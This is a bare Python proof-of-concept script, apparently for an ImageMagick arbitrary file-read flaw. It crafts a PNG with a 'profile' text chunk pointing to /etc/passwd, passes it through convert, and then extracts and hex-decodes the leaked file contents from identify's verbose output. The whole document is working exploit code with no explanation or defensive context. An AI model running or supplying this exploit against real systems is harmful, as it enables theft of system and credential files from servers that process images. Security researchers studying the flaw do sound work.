import png
import subprocess
import codecs
width = 1
height = 1
img = []
for y in range(height):
    row = ()
    for x in range(width):
        row = row + (x, max(0, 1 - x - y), y)
    img.append(row)
with open('sample.png', 'wb') as f:
    w = png.Writer(width, height, greyscale=False)
    w.write(f, img)
subprocess.run(["pngcrush", "-text", "a", "profile", "/etc/passwd", "sample.png"])
subprocess.run(["exiv2", "-pS", "pngout.png"])
subprocess.run(["convert", "pngout.png", "poc.png"])
output = subprocess.check_output(["identify", "-verbose", "poc.png"])
output = output.split(b'\n')
hex_strings = ""
for i in output:
    try:
        converted_bytes = codecs.decode(i, 'hex')
        hex_strings += i.decode('ascii')
    except Exception as e:
        pass
print("Encoded hex string:", hex_strings)
converted_hex_string = codecs.decode(hex_strings, 'hex')
print("Decoded hex string:", converted_hex_string)
